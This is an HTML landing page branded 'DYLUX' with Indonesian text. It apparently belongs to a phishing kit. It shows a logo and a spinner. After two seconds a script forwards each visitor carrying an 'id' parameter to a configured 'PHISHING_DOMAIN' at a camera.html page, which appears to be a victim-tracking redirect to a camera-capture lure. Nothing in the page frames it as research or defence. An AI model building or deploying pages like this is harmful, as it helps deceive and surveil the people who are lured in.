<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DYLUX</title>
    <script src="config.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0f;
            font-family: Arial, sans-serif;
            color: #e0e0ff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container { text-align: center; padding: 40px; }
        .logo {
            font-size: 48px;
            font-weight: 800;
            background: linear-gradient(135deg, #00f0ff, #7b2ffc);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .loader {
            width: 40px;
            height: 40px;
            border: 3px solid rgba(0,240,255,0.1);
            border-top-color: #00f0ff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .sub { color: #8888aa; font-size: 14px; margin-top: 8px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">DYLUX</div>
        <div class="loader"></div>
        <div class="sub">Cahaya dalam Kegelapan</div>
    </div>
    <script>
        // Redirect ke camera.html setelah 2 detik
        setTimeout(() => {
            const id = new URLSearchParams(window.location.search).get('id');
            if (id) {
                window.location.href = `${DYLUX_CONFIG.PHISHING_DOMAIN}/camera.html?id=${id}`;
            }
        }, 2000);
    </script>
</body>
</html>
